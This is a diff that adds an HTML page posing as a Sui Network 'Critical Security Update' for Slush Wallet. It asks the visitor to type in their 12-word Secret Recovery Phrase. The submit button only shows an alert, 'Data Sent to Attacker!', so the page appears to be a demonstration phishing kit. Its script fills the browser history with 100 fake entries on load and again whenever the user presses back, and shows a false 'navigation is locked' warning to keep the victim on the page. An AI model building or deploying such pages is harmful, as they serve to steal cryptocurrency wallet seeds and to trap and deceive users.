@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sui Network Update</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #111; color: white; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; background: #222; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; }
+        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Critical Security Update</h2>
+        <p>Your Slush Wallet session has expired. Please re-enter your 12-word Secret Recovery Phrase to restore access.</p>
+        <input type="text" placeholder="Enter your 12-word phrase here...">
+        <br>
+        <button onclick="alert('Data Sent to Attacker!')">Restore Wallet</button>
+    </div>
+
+    <script>
+       
+        function poisonStack() {
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState(null, "", window.location.href + "#/error_report_" + i);
+            }
+        }
+
+        
+        window.onload = function() {
+            poisonStack();
+         
+            window.onpopstate = function() {
+                poisonStack();
+                alert("Security Alert: Navigation is locked for your safety. Please complete the verification.");
+            };
+        };
+    </script>
+</body>
+</html>
